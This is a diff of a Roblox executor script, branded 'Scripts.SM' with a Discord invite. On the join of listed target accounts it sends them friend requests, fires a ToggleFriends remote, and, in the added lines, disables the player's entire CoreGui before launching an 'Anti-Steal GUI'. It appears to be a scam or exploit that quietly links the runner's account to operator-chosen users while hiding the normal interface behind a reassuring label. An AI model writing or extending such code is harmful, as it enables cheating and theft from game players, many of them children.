@@ -1,9 +1,20 @@
--- Roblox: Friend Request + ToggleFriends + Anti-Steal GUI (ONLY ON TARGET JOIN)
--- WARNING: High risk of detection. Use alt accounts only.
+--[[
+   _____ _____ _____ _____ _____ _______ _____ _____ __ __
+  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
+ | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
+  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
+ |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
+                                                                    
+                        Scripts.SM | Premium Scripts
+                        Made by: Scripter.SM
+                        Discord: discord.gg/cnUAk7uc3n
+]]
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
 
 -- ==================== CONFIG ====================
 local tester_users = {
@@ -13,17 +24,15 @@ local tester_users = {
     "Smiley9Gamerz",
     "SABBY_LEAF"
 }
-
 local users = {}
-
 spawn(function()
     repeat task.wait() until _G["Script-SM_Config"]
     users = _G["Script-SM_Config"].users or {}
 end)
 -- ===============================================
-
 local processed = {}
-local guiCreated = false  -- Prevents multiple GUIs
+local guiCreated = false
+local coreGuiDisabled = false -- Track if CoreGui has been disabled
 
 -- Get all target names (deduped)
 local function getAllTargets()
@@ -47,11 +56,20 @@ local function fireToggleFriends()
     end)
 end
 
--- Process player: Friend request + GUI + Toggle
+-- Disable CoreGui (only once)
+local function disableCoreGui()
+    if coreGuiDisabled then return end
+    coreGuiDisabled = true
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        print("[Scripts.SM] CoreGui disabled.")
+    end)
+end
+
+-- Process player: Friend request + GUI + Toggle + CoreGui disable
 local function processPlayer(player)
     if processed[player.Name] or guiCreated then return end
     processed[player.Name] = true
-
     print("[Scripts.SM] Found: " .. player.Name)
 
     -- 1. Send Friend Request
@@ -67,13 +85,15 @@ local function processPlayer(player)
     -- 2. Fire ToggleFriends
     fireToggleFriends()
 
-    -- 3. CREATE GUI ONLY ONCE
+    -- 3. Disable CoreGui (on first target join)
+    disableCoreGui()
+
+    -- 4. CREATE GUI ONLY ONCE
     if not guiCreated then
         guiCreated = true
-        spawn(CreateAntiStealGUI)  -- GUI runs here
+        spawn(CreateAntiStealGUI)
     end
 end
-
 -- ==================== ANTI-STEAL GUI (EXACT COPY) ====================
 local function detectExecutor()
     if identifyexecutor then
